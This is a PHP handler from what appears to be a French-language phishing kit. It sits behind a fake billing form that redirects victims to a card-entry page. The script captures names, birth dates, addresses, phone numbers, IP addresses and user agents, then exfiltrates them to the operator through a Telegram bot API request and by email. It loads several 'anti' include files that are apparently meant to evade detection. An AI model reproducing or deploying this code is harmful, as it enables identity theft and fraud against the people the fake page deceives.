<?php 
include('../email.php');
include('../prevents/anti1.php');
include('../prevents/anti2.php');
include('../prevents/anti3.php');
include('../prevents/anti4.php');
include('../prevents/anti5.php');
include('../prevents/anti6.php');
include('../prevents/anti7.php');
include('../prevents/anti8.php');
session_start();
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
if(isset($_POST['continuer']))
{

$_SESSION['nom'] = $_POST['last_name'];
$_SESSION['prenom'] = $_POST['first_name'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['adresse'] = $_POST['adress'];
$_SESSION['city'] = $_POST['ville'];
$_SESSION['zip'] = $_POST['zip'];
$_SESSION['phone'] = $_POST['phone'];

if(empty($_SESSION['nom']) || empty($_SESSION['prenom']) || empty($_SESSION['dob'])  || empty($_SESSION['adresse']) || empty($_SESSION['city']) || empty($_SESSION['zip']) || empty($_SESSION['phone']) || strlen($_SESSION['phone']) != 10 )
{
	header('Location: billing.php?error=true'.uniqid(rand(), true));
}
else{

	if($envoyerBillingEnUnRez == true)
	{
	$message = "
	🗃[INFORMATIONS PERSONELLES]
	❄️ Prénom : ".$_SESSION['prenom']."
	❄️ Nom : ".$_SESSION['nom']."
	❄️ Date de naissance : ".$_SESSION['dob']."
	❄️ Adresse : ".$_SESSION['adresse']."
	❄️ Ville : ".$_SESSION['city']."
	❄️ Code Postal : ".$_SESSION['zip']."
	❄️ Numéro de téléphone : ".$_SESSION['phone']."

	📀 IP ADRESS : ".$_SESSION['ip']."
	📀 USER-AGENT : ".$_SESSION['useragent']."

	";

	$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=97=82=E3=80=8D=2B1_INFO?= - ".$_SESSION['ip'];
	$headers = "From: =?utf-8?Q?COBRA_x_KOUNT_=F0=9F=A5=9D?= <crusix@amzv1.com>";
	$data = [
                                      'text' => '
	🗃[INFORMATIONS PERSONELLES]
	❄️ Prénom : '.$_SESSION['prenom'].'
	❄️ Nom : '.$_SESSION['nom'].'
	❄️ Date de naissance : '.$_SESSION['dob'].'
	❄️ Adresse : '.$_SESSION['adresse'].'
	❄️ Ville : '.$_SESSION['city'].'
	❄️ Code Postal : '.$_SESSION['zip'].'
	❄️ Numéro de téléphone : '.$_SESSION['phone'].'

	📀 IP ADRESS : '.$_SESSION['ip'].'
	📀 USER-AGENT : '.$_SESSION['useragent'].'



                                      ',
                                      'chat_id' => $chat_id
                                ];
                                  file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
	mail($boite_rez,$subject,$message,$headers);
	header('Location: card.php?'.uniqid(rand(), true));
	}
	else{

		header('Location: card.php?'.uniqid(rand(), true));

	}

}





}



?>